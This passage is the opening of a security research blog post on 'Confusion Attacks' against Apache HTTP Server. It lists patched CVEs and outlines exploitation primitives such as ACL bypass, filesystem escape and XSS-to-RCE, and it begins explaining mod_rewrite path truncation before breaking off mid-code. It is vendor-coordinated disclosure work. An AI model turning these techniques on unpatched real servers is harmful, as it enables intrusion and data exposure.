

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | DEVCORE</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies. The content includes, but is not limited to:  1. How a single ? can bypass Httpd's built-in access control and authentication. 2. How unsafe RewriteRules can escape the Web Root and access the entire filesystem. 3. How to leverage a piece of code from 1996 to transform an XSS into RCE." />
    <meta name="keywords" content="CVE-2024-38472, CVE-2024-39573, CVE-2024-38477, CVE-2024-38476, CVE-2024-38475, CVE-2024-38474, CVE-2024-38473, CVE-2023-38709" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20240809/cover.png" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies. The content includes, but is not limited to:  1. How a single ? can bypass Httpd's built-in access control and authentication. 2. How unsafe RewriteRules can escape the Web Root and access the entire filesystem. 3. How to leverage a piece of code from 1996 to transform an XSS into RCE.">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image" content="https://devco.re/assets/img/blog/20240809/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body class="en">
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>Services<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    Red Team Assessment
                                </h2>
                                <p class="two-line">
                                    Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    Penetration Testing
                                </h2>
                                <p class="two-line">
                                    Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    Security Consulting
                                </h2>
                                <p class="two-line">
                                    Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    Security Training
                                </h2>
                                <p class="two-line">
                                    Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.
                                </p>
                            </div>
                        </a>
                        <a href="https://training.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu offsec"></i>
                                    OffSec Advanced Training <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    Structured in-person (OffSec Live Training) and online training, featuring up-to-date offensive security skills with OffSec certification and resources.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>Research<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    Overview
                                </h2>
                                <p class="two-line">
                                    Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    Competitions and Awards
                                </h2>
                                <p class="two-line">
                                    Awards from international cybersecurity competitions.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    Enterprise Vulnerability Reports
                                </h2>
                                <p class="two-line">
                                    Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    International Conferences
                                </h2>
                                <p class="two-line">
                                    Sharing vulnerability research and security knowledge at international cybersecurity conferences.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE List
                                </h2>
                                <p class="two-line">
                                    Discovery of critical vulnerabilities in leading international products and services.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>Company<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                Company Overview
                            </h2>
                            <p>
                                Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment,  Penetration Testing, Security Consulting, and Security Training.
                            </p>
                        </div>
                        </a>
                        <a href="/en/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    Team Members
                                </h2>
                                <p class="two-line">
                                    Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    Achievements
                                </h2>
                                <p class="two-line">
                                    DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    Corporate Social Responsibility
                                </h2>
                                <p class="two-line">
                                    We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    Job Opportunities
                                </h2>
                                <p class="two-line">
                                    Join us to secure the world and improve the cybersecurity industry together.
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    DEVCORE CONFERENCE <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    DEVCORE’s annual technical conference focused on offensive security research, red team insights, and novel attack vectors from real-world operations.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>News<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/en/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    Latest news
                                </p>
                            </div>
                        </a>
                        <a href="/en/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    Media Resources
                                </h2>
                                <p>
                                    Media Kit, Logo and Usage Guideline
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/en/search/">Search</a>
            </li>
            <li>
                <a class="menuLable" href="/en/contact/">Contact</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>Services</span>
                <div class="menuItem">
                    <a href="/en/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                Red Team Assessment
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                Penetration Testing
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                Security Consulting
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                Security Training
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>Research</span>
                <div class="menuItem">
                    <a href="/en/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>Overview</h2>
                        </div>
                    </a>
                    <a href="/en/research/awards/">
                        <div class="item">
                            <h2>Competitions and Awards</h2>
                        </div>
                    </a>
                    <a href="/en/research/bug-bounty/">
                        <div class="item">
                            <h2>Enterprise Vulnerability Reports</h2>
                        </div>
                    </a>
                    <a href="/en/research/talks/">
                        <div class="item">
                            <h2>International Conferences</h2>
                        </div>
                    </a>
                    <a href="/en/research/cve/">
                        <div class="item">
                            <h2>CVE List</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>Company</span>
                <div class="menuItem">
                    <a href="/en/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>Company Overview</h2>
                        </div>
                    </a>
                    <a href="/en/company/our-team/">
                        <div class="item">
                            <h2>Team Members</h2>
                        </div>
                    </a>
                    <a href="/en/company/history/">
                        <div class="item">
                            <h2>Achievements</h2>
                        </div>
                    </a>
                    <a href="/en/company/csr/">
                        <div class="item">
                            <h2>Corporate Social Responsibility</h2>
                        </div>
                    </a>
                    <a href="/en/company/jobs/">
                        <div class="item">
                            <h2>Job Opportunities</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>News</span>
                <div class="menuItem">
                    <a href="/en/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/en/media-kit/">
                        <div class="item">
                            <h2>Media Resources</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/en/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                Search
                            </h2>
                        </div>
                    </a>
                    <a href="/en/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                Contact
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/en/blog/">All Articles</a>
                </li>
                <li>
                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
                </li>
                <li>
                    <a href="/en/media-kit/">Media Resources</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
                    <span class="tag">

                      <a href="/en/blog/tag/CVE/">#CVE</a> <a href="/en/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/en/blog/tag/RCE/">#RCE</a> <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/Apache/">#Apache</a> 
                    </span>
                    <h1>
                        Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/en/blog/author/orange">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/en/blog/author/orange">Orange Tsai</a></span>
                        <span class="date">2024-08-09</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20240809/cover.png"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<h6 id="orange-tsai-orange_8361--繁體中文版本--english-version">Orange Tsai (<a href="https://x.com/orange_8361">@orange_8361</a>)  |  <a href="/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/">繁體中文版本</a>  |  <a href="/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/">English Version</a></h6>

<style>
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
</style>

<p>Hey there! This is my research on Apache HTTP Server presented at <a href="https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227">Black Hat USA 2024</a>. Additionally, this research will also be presented at <a href="https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/">HITCON</a> and <a href="https://orangecon.nl/">OrangeCon</a>. If you’re interested in getting a preview, you can check the slides here:</p>

<blockquote>
  <p><a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></p>
</blockquote>

<p>Also, I would like to thank Akamai for their friendly outreach! They released mitigation measures immediately after this research was published (details can be found on <a href="https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore">Akamai’s blog</a>).</p>

<p><br /></p>

<h2 id="tldr">TL;DR</h2>

<p>This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, <strong>including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies</strong>. The content includes, but is not limited to:</p>

<ol>
  <li>How a single <code class="language-plaintext highlighter-rouge">?</code> can bypass Httpd’s built-in access control and authentication.</li>
  <li>How unsafe <code class="language-plaintext highlighter-rouge">RewriteRules</code> can escape the Web Root and access the entire filesystem.</li>
  <li>How to leverage a piece of code from 1996 to transform an XSS into RCE.</li>
</ol>

<p><br /></p>

<h2 id="outline">Outline</h2>

<ul>
  <li><a href="#before-the-story">Before the Story</a></li>
  <li><a href="#how-did-the-story-begin">How Did the Story Begin?</a></li>
  <li><a href="#why-apache-http-server-smells-bad">Why Apache HTTP Server Smells Bad?</a></li>
  <li><a href="#a-whole-new-attack--confusion-attack">A Whole New Attack — Confusion Attack</a>
    <ul>
      <li><a href="#-1-filename-confusion">1. Filename Confusion</a>
        <ul>
          <li><a href="#%ef%b8%8f-primitive-1-1-truncation">Primitive 1-1. Truncation</a>
            <ul>
              <li><a href="#%ef%b8%8f-1-1-1-path-truncation">1-1-1. Path Truncation</a></li>
              <li><a href="#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment">1-1-2. Mislead RewriteFlag Assignment</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-1-2-acl-bypass">Primitive 1-2. ACL Bypass</a></li>
        </ul>
      </li>
      <li><a href="#-2-documentroot-confusion">2. DocumentRoot Confusion</a>
        <ul>
          <li><a href="#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure">Primitive 2-1. Server-Side Source Code Disclosure</a>
            <ul>
              <li><a href="#%ef%b8%8f-2-1-1-disclose-cgi-source-code">2-1-1. Disclose CGI Source Code</a></li>
              <li><a href="#%ef%b8%8f-2-1-2-disclose-php-source-code">2-1-2. Disclose PHP Source Code</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation">Primitive 2-2. Local Gadgets Manipulation!</a>
            <ul>
              <li><a href="#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure">2-2-1. Local Gadget to Information Disclosure</a></li>
              <li><a href="#%ef%b8%8f-2-2-2-local-gadget-to-xss">2-2-2. Local Gadget to XSS</a></li>
              <li><a href="#%ef%b8%8f-2-2-3-local-gadget-to-lfi">2-2-3. Local Gadget to LFI</a></li>
              <li><a href="#%ef%b8%8f-2-2-4-local-gadget-to-ssrf">2-2-4. Local Gadget to SSRF</a></li>
              <li><a href="#%ef%b8%8f-2-2-5-local-gadget-to-rce">2-2-5. Local Gadget to RCE</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets">Primitive 2-3. Jailbreak from Local Gadgets</a>
            <ul>
              <li><a href="#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets">2-3-1. Jailbreak from Local Gadgets</a></li>
              <li><a href="#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce">2-3-2. Jailbreak Local Gadgets to Redmine RCE</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#-3-handler-confusion">3. Handler Confusion</a>
        <ul>
          <li><a href="#%ef%b8%8f-primitive-3-1-overwrite-the-handler">Primitive 3-1. Overwrite the Handler</a>
            <ul>
              <li><a href="#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code">3-1-1. Overwrite Handler to Disclose PHP Source Code</a></li>
              <li><a href="#%ef%b8%8f-3-1-2-overwrite-handler-to---">3-1-2. Overwrite Handler to ██████ ███████ ██████</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers">Primitive 3-2. Invoke Arbitrary Handlers</a>
            <ul>
              <li><a href="#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure">3-2-1. Arbitrary Handler to Information Disclosure</a></li>
              <li><a href="#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts">3-2-2. Arbitrary Handler to Misinterpret Scripts</a></li>
              <li><a href="#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf">3-2-2. Arbitrary Handler to Full SSRF</a></li>
              <li><a href="#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket">3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</a></li>
              <li><a href="#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce">3-2-4. Arbitrary Handler to RCE</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#-4-other-vulnerabilities">4. Other Vulnerabilities</a>
        <ul>
          <li><a href="#%ef%b8%8f-cve-2024-38472---windows-unc-based-ssrf">CVE-2024-38472 - Windows UNC-based SSRF</a>
            <ul>
              <li><a href="#%ef%b8%8f-triggered-via-http-request-parser">Triggered via HTTP Request Parser</a></li>
              <li><a href="#%ef%b8%8f-triggered-via-type-map">Triggered via Type-Map</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix">CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#future-works">Future Works</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
</ul>

<p><br /></p>

<h2 id="before-the-story">Before the Story</h2>

<p>This section is just some personal murmurs. If you’re only interested in the technical details, jump straight to — <a href="#how-did-the-story-begin">How Did the Story Begin?</a></p>

<p>As a researcher, perhaps the greatest joy is seeing your work recognized and understood by peers. Therefore, after completing a significant research with fruitful results, it is natural to want the world to see it — which is why I’ve presented multiple times at Black Hat USA and DEFCON. As you might know, since 2022, I have been unable to obtain a valid travel authorization to enter the U.S. (For Taiwan, travel authorization under the <a href="https://esta.cbp.dhs.gov/">Visa Waiver Program</a> can typically be obtained online within minutes to hours), leading me to miss the in-person talk at <a href="https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199">Black Hat USA 2022</a>. Even a solo trip to Machu Picchu and Easter Island in 2023 couldn’t transit through the U.S. :(</p>

<p>To address this situation, I started preparing for a B1/B2 visa in January this year, writing various documents, interviewing at the embassy, and endlessly waiting. It’s not fun. But to have my work seen, I still spent a lot of time seeking all possibilities, even until three weeks before the conference, it was unclear whether my talk would be canceled or not (BH only accepted in-person talks, but thanks to the RB, it could ultimately be presented in pre-recorded format). So, everything you see, including slides, videos, and this blog, was completed within just a few dozen days. 😖</p>

<p>As a pure researcher with a clear conscience, my attitude towards vulnerabilities has always been — they should be directly reported to and fixed by the vendor. Writing these words isn’t for any particular reason, just to record some feelings of helplessness, efforts in this year, and to thank those who have helped me this year, thank you all :)</p>

<p><br /></p>

<h2 id="how-did-the-story-begin">How Did the Story Begin?</h2>

<p>Around the beginning of this year, I started thinking about my next research target. As you might know, I always aim to challenge big targets that can impact the entire internet, so I began searching for some complex topics or interesting open-source projects like Nginx, PHP, or even delved into RFCs to strengthen my understanding of protocol details.</p>

<p>While most attempts ended in failure (though a few might become topics for next blog posts 😉), reading these codes reminded me of a quick review I had done of Apache HTTP Server last year! Although I didn’t dive deep into the code due to the work schedule, I had already “smelled” something not quite right about its coding style at that time.</p>

<p>So this year, I decided to continue on that research, transforming the “bad smells” from an indescribable “feeling” into concrete research on Apache HTTP Server!</p>

<p><br /></p>

<h2 id="why-apache-http-server-smells-bad">Why Apache HTTP Server Smells Bad?</h2>

<p>Firstly, the Apache HTTP Server is a world constructed by “modules,” as proudly declared in its <a href="https://httpd.apache.org/docs/2.4/mpm.html">official documentation</a> regarding its modularity:</p>

<blockquote>
  <p>Apache httpd has always accommodated a wide variety of environments through its modular design. […] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.</p>
</blockquote>

<p>The entire Httpd service relies on hundreds of small modules working together to handle a client’s HTTP request. <strong>Among the <a href="https://httpd.apache.org/docs/2.4/mod/">136 modules listed by the official documentation</a>, about half are either enabled by default or frequently used by websites</strong>!</p>

<p>What’s even more surprising is that these modules also maintain a colossal <code class="language-plaintext highlighter-rouge">request_rec</code> structure while processing client HTTP requests. This structure includes all the elements involved in handling HTTP, with its detailed definition available in <a href="https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838">include/httpd.h</a>. All modules depend on this massive structure for synchronization, communication, and data exchange. As an HTTP request passes through several phases, modules act like players in a game of catch, passing the structure from one to another. Each module even has the ability to modify any value in this structure according to its own preferences!</p>

<p><img src="/assets/img/blog/20240809/1.png" alt="" /></p>

<p>This type of collaboration is not new from a software engineering perspective. Each module simply focuses on its own task. As long as everyone finishes their work, then the client can enjoy the service provided by Httpd. This approach might work well with a few modules, <strong>but what happens when we scale it up to hundreds of modules collaborating — can they really work  well together?</strong> 🤔</p>

<p>Our starting point is straightforward — <strong>the modules do not fully understand each other, yet they are required to cooperate</strong>. Each module might be implemented by different people, with the code undergoing years of iterations, refactors, and modifications. Do they really still know what they are doing? Even if they understand their own duty, what about other modules’ implementation details? Without any good development standards or guidelines, there must be several gaps that we can exploit!</p>

<p><br /></p>

<h2 id="a-whole-new-attack--confusion-attack">A Whole New Attack — Confusion Attack</h2>

<p>Based on these observations, we started <strong>focusing on the “relationships” and “interactions” among these modules</strong>. If a module accidentally modifies a structure field that it considers unimportant, but is crucial for another module, it could affect the latter’s decisions. Furthermore, if the definitions or semantics of the fields are not precise enough, causing ambiguities in how modules understand the same fields, it could lead to potential security risks as well!</p>

<p>From this starting point, we developed three different types of attacks, as these attacks are more or less related to the misuse of structure fields. Hence, we’ve named this attack surface “Confusion Attack,” and the following are the attacks we developed:</p>

<ol>
  <li><strong>Filename Confusion</strong></li>
  <li><strong>DocumentRoot Confusion</strong></li>
  <li><strong>Handler Confusion</strong></li>
</ol>

<p>Through these attacks, we have identified 9 different vulnerabilities:</p>

<ol>
  <li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li>
  <li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li>
  <li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li>
  <li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect</li>
  <li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li>
  <li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li>
  <li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li>
  <li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li>
  <li><strong>CVE-2024-??????</strong> - [redacted]</li>
</ol>

<p>These vulnerabilities were reported through the official security mailing list and were addressed by the Apache HTTP Server in the <a href="https://httpd.apache.org/security/vulnerabilities_24.html">2.4.60 update</a> published on 2024-07-01.</p>

<p>As this is a new attack surface from Httpd’s architectural design and its internal mechanisms, naturally, <del>the first person to delve into it can find the most vulnerabilities. Thus, I currently hold the most CVEs from Apache HTTP Server 😉.</del> it leads to many updates that are not backward compatible. Therefore, patching these issues is not easy for many long-running production servers. If administrators update without careful consideration, they might disrupt existing configurations, causing service downtime. 😨</p>

<p>Now, it’s time to get started with our Confusion Attacks! Are you ready?</p>

<p><br /></p>

<h3 id="-1-filename-confusion">🔥 1. Filename Confusion</h3>

<p>The first issue stems from confusion regarding the filename field. Literally, <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> should represent a filesystem path. However, in Apache HTTP Server, some modules treat it as a URL. If, within an HTTP context, most modules consider <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> as a filesystem path but some others treat it as a URL, this inconsistency can lead to security issues!</p>

<p><br /></p>

<h4 id="️-primitive-1-1-truncation">⚔️ Primitive 1-1. Truncation</h4>

<p>So, which modules treat <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> as a URL? The first is <code class="language-plaintext highlighter-rouge">mod_rewrite</code>, which allows sysadmins to easily rewrite a path pattern to a specified substitution target using the <code class="language-plaintext highlighter-rouge">RewriteRule</code> directive:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span> Pattern Substitution [flags]
</code></pre></div></div>

<p>The target can be either a filesystem path or a URL. This feature likely exists for user experience. However, this “convenience” also introduces risks. For instance, <strong>while rewriting the target paths, <code class="language-plaintext highlighter-rouge">mod_rewrite</code> forcefully treats all results as a URL</strong>, truncating the path after a question mark <code class="language-plaintext highlighter-rouge">%3F</code>. This leads to the following two exploitations.</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141">modules/mappers/mod_rewrite.c#L4141</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Apply a single RewriteRule
 */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">apply_rewrite_rule</span><span class="p">(</span><span class="n">rewriterule_entry</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">rewrite_ctx</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ap_regmatch_t</span> <span class="n">regmatch</span><span class="p">[</span><span class="n">AP_MAX_REG_MATCH</span><span class="p">];</span>
